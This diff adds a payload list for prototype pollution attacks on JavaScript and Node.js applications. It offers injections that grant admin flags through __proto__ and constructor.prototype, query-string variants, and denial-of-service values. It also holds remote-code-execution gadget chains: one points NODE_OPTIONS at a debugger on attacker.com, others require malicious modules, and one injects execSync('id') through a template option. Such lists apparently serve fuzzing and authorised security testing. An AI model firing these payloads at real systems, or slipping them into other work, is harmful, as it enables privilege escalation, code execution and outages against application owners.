@@ -1,0 +1,26 @@
+# Prototype Pollution - __proto__ property injection
+{"__proto__": {"isAdmin": true}}
+{"__proto__": {"role": "admin"}}
+{"__proto__": {"admin": true}}
+{"__proto__": {"status": 1}}
+
+# Prototype Pollution - constructor.prototype injection
+{"constructor": {"prototype": {"isAdmin": true}}}
+{"constructor": {"prototype": {"role": "admin"}}}
+{"constructor": {"prototype": {"canDelete": true}}}
+
+# Prototype Pollution - query parameter
+__proto__[isAdmin]=true
+__proto__.role=admin
+constructor[prototype][isAdmin]=true
+
+# Prototype Pollution - RCE via gadget chains
+{"__proto__": {"shell": "/proc/self/exe", "argv0": "node", "NODE_OPTIONS": "--require /proc/self/environ"}}
+{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=attacker.com:9229"}}
+{"__proto__": {"env": {"NODE_OPTIONS": "--require /app/malicious.js"}}}
+{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}
+
+# Prototype Pollution - DoS
+{"__proto__": {"toString": "polluted"}}
+{"__proto__": {"valueOf": "polluted"}}
+{"__proto__": {"length": 99999999}}
